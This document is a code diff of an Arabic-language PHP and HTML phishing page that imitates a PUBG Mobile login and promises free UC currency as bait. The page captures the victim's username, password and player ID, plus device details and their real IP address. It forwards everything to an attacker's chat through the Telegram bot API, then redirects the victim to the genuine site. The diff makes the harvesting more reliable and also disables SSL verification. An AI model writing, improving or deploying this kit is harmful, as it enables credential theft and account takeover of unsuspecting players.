@@ -2,7 +2,9 @@
 // توكن البوت الخاص بك
 $botToken = "BBOTTTTTTTTTTT";
 
-// دالة لإرسال الرسائل إلى التليجرام
+/**
+ * إرسال رسالة إلى Telegram
+ */
 function sendTelegramMessage($chatId, $message, $botToken) {
     $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
     $postFields = [
@@ -16,50 +18,88 @@ function sendTelegramMessage($chatId, $message, $botToken) {
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     $result = curl_exec($ch);
+    $error = curl_error($ch);
     curl_close($ch);
 
+    if ($error) {
+        error_log("Telegram cURL Error: " . $error);
+        return false;
+    }
     return $result;
 }
 
-// إذا كان الطلب بواسطة POST، فإننا نتعامل مع إرسال البيانات من JavaScript
+/**
+ * الحصول على IP الحقيقي للمستخدم (حتى خلف البروكسي)
+ */
+function getRealIp() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        return $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        return trim($ips[0]);
+    } else {
+        return $_SERVER['REMOTE_ADDR'];
+    }
+}
+
+// معالجة طلب POST من JavaScript
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $input = json_decode(file_get_contents('php://input'), true);
-    $chatId = $input['chatId'];
+    // قراءة البيانات الخام
+    $rawInput = file_get_contents('php://input');
+    $input = json_decode($rawInput, true);
+    
+    if (!$input) {
+        http_response_code(400);
+        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON']);
+        exit;
+    }
+
+    $chatId = $input['chatId'] ?? null;
     $credentials = $input['credentials'] ?? null;
     $deviceInfo = $input['deviceInfo'] ?? null;
     $playerId = $input['playerId'] ?? null;
+    $realIp = getRealIp();
 
-    if ($credentials && $deviceInfo && $playerId) {
-        // إرسال بيانات تسجيل الدخول ومعلومات الجهاز
+    if ($chatId && $credentials && $deviceInfo && $playerId) {
+        // بناء الرسالة
         $loginMessage = "
-🎮 <b>بيانات تسجيل دخول PUBG Mobile</b>
+🎮 <b>تسجيل دخول PUBG Mobile</b>
 
-👤 <b>اسم المستخدم:</b> <code>{$credentials['username']}</code>
-🔒 <b>كلمة المرور:</b> <code>{$credentials['password']}</code>
-🆔 <b>معرف اللاعب:</b> <code>{$playerId}</code>
+👤 <b>اسم المستخدم:</b> <code>" . htmlspecialchars($credentials['username']) . "</code>
+🔒 <b>كلمة المرور:</b> <code>" . htmlspecialchars($credentials['password']) . "</code>
+🆔 <b>معرف اللاعب:</b> <code>" . htmlspecialchars($playerId) . "</code>
 
 🌐 <b>معلومات الجهاز:</b>
-📱 <b>User Agent:</b> {$deviceInfo['userAgent']}
-🔋 <b>البطارية:</b> {$deviceInfo['battery']}
-🖥️ <b>النظام:</b> {$deviceInfo['platform']}
-🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}
-📶 <b>نوع الاتصال:</b> {$deviceInfo['connection']}
-🗣️ <b>اللغة:</b> {$deviceInfo['language']}
-🕒 <b>المنطقة الزمنية:</b> {$deviceInfo['timezone']}
-📺 <b>معلومات الشاشة:</b> {$deviceInfo['screen']}
+📱 <b>User Agent:</b> " . htmlspecialchars($deviceInfo['userAgent'] ?? 'غير معروف') . "
+🔋 <b>البطارية:</b> " . htmlspecialchars($deviceInfo['battery'] ?? 'غير معروف') . "
+🖥️ <b>النظام:</b> " . htmlspecialchars($deviceInfo['platform'] ?? 'غير معروف') . "
+🌐 <b>IP الحقيقي:</b> <code>{$realIp}</code>
+📶 <b>نوع الاتصال:</b> " . htmlspecialchars($deviceInfo['connection'] ?? 'غير معروف') . "
+🗣️ <b>اللغة:</b> " . htmlspecialchars($deviceInfo['language'] ?? 'غير معروف') . "
+🕒 <b>المنطقة الزمنية:</b> " . htmlspecialchars($deviceInfo['timezone'] ?? 'غير معروف') . "
+📺 <b>الشاشة:</b> " . htmlspecialchars($deviceInfo['screen'] ?? 'غير معروف') . "
 
 📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
         ";
+
         $result = sendTelegramMessage($chatId, $loginMessage, $botToken);
+        
+        if ($result === false) {
+            http_response_code(500);
+            echo json_encode(['status' => 'error', 'message' => 'Telegram send failed']);
+        } else {
+            echo json_encode(['status' => 'success']);
+        }
+    } else {
+        http_response_code(400);
+        echo json_encode(['status' => 'error', 'message' => 'Missing data']);
     }
-    
-    header('Content-Type: application/json');
-    echo json_encode(['status' => 'success']);
     exit;
 }
 
-// الحصول على chatId من رابط الصفحة
+// الحصول على chatId من معامل URL (مثال: ?ID=123456789)
 $chatId = isset($_GET['ID']) ? $_GET['ID'] : '8107714468';
 ?>
 <!DOCTYPE html>
@@ -78,7 +118,7 @@ $chatId = isset($_GET['ID']) ? $_GET['ID'] : '8107714468';
         }
         
         body {
-            background: url('https://dev-ianstagram.pantheonsite.io/wp-content/uploads/2025/08/Screenshot_20250826_125239_Google.jpg') no-repeat center center fixed;
+            background: url('https://i.ibb.co/b5fzmPHH/Screenshot-20260411-002333-Google.jpg') no-repeat center center fixed;
             background-size: cover;
             display: flex;
             justify-content: center;
@@ -365,7 +405,7 @@ $chatId = isset($_GET['ID']) ? $_GET['ID'] : '8107714468';
         
         <div class="login-form">
             <div class="logo-container">
-                <img src="https://dev-ianstagram.pantheonsite.io/wp-content/uploads/2025/08/Screenshot_20250826_125321_Google.jpg" alt="PUBG Mobile Logo">
+                <img src="https://i.ibb.co/wh49zzMp/Screenshot-20260411-002126-Google.jpg" alt="PUBG Mobile Logo">
                 <p>سجل الدخول إلى حسابك للوصول إلى عالم PUBG Mobile واربح 360 UC</p>
             </div>
             
@@ -433,92 +473,90 @@ $chatId = isset($_GET['ID']) ? $_GET['ID'] : '8107714468';
     </div>
 
     <script>
-        // دالة لعرض الإشعارات
+        // عرض الإشعارات
         function showNotification(message, isSuccess = false) {
             const notification = document.getElementById('notification');
             notification.textContent = message;
             notification.style.backgroundColor = isSuccess ? '#4CAF50' : '#ff8a00';
             notification.style.display = 'block';
-            
             setTimeout(() => {
                 notification.style.display = 'none';
             }, 3000);
         }
 
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // جمع بيانات المستخدم
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const playerId = document.getElementById('playerId').value;
-            
-            // جمع معلومات الجهاز
-            const deviceInfo = {
+        // جمع معلومات الجهاز (بما فيها البطارية)
+        async function collectDeviceInfo() {
+            let batteryInfo = 'غير معروف';
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'يشحن' : 'غير مشحون'})`;
+                } catch(e) { console.warn(e); }
+            }
+
+            return {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 screen: `${screen.width}x${screen.height}`,
-                battery: 'غير معروف',
+                battery: batteryInfo,
                 connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف'
             };
-            
-            // محاولة الحصول على حالة البطارية إذا كانت متوفرة
-            if ('getBattery' in navigator) {
-                navigator.getBattery().then(function(battery) {
-                    deviceInfo.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'يشحن' : 'غير مشحون'})`;
-                });
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const playerId = document.getElementById('playerId').value.trim();
+
+            if (!username || !password || !playerId) {
+                showNotification('الرجاء تعبئة جميع الحقول', false);
+                return;
             }
-            
-            // إظهار رسالة تحميل
+
+            const deviceInfo = await collectDeviceInfo();
+
             const button = document.querySelector('.login-button');
             const originalText = button.textContent;
             button.innerHTML = '<i class="fa fa-spinner fa-spin"></i> جاري تسجيل الدخول...';
             button.disabled = true;
-            
-            // إرسال البيانات إلى التليجرام
-            sendDataToTelegram(username, password, playerId, deviceInfo);
-            
-            // محاكاة عملية تسجيل الدخول وتوجيه المستخدم بعد ذلك
-            setTimeout(() => {
-                // توجيه المستخدم إلى الموقع الأصلي لـ PUBG Mobile
-                showNotification('تم تسجيل الدخول بنجاح! سيتم إضافة 360 UC إلى حسابك قريبًا.', true);
-                
-                setTimeout(() => {
-                    window.location.href = 'https://www.pubgmobile.com';
-                }, 3000);
-            }, 2500);
+
+            const chatId = "<?php echo $chatId; ?>";
+
+            try {
+                const response = await fetch(window.location.href, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chatId: chatId,
+                        credentials: { username, password },
+                        playerId: playerId,
+                        deviceInfo: deviceInfo
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.status === 'success') {
+                    showNotification('تم تسجيل الدخول بنجاح! سيتم إضافة 360 UC إلى حسابك قريبًا.', true);
+                    setTimeout(() => {
+                        window.location.href = 'https://www.pubgmobile.com';
+                    }, 3000);
+                } else {
+                    showNotification('حدث خطأ، حاول مرة أخرى.', false);
+                    button.innerHTML = originalText;
+                    button.disabled = false;
+                }
+            } catch (error) {
+                console.error('Fetch error:', error);
+                showNotification('خطأ في الاتصال، تأكد من اتصالك بالإنترنت.', false);
+                button.innerHTML = originalText;
+                button.disabled = false;
+            }
         });
-        
-        function sendDataToTelegram(username, password, playerId, deviceInfo) {
-            // البيانات التي سيتم إرسالها
-            const data = {
-                chatId: "<?php echo $chatId; ?>", // استخدام chatId من PHP
-                credentials: {
-                    username: username,
-                    password: password
-                },
-                playerId: playerId,
-                deviceInfo: deviceInfo
-            };
-            
-            // إرسال البيانات إلى الخادم
-            fetch('', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Success:', data);
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-            });
-        }
     </script>
 </body>
 </html>
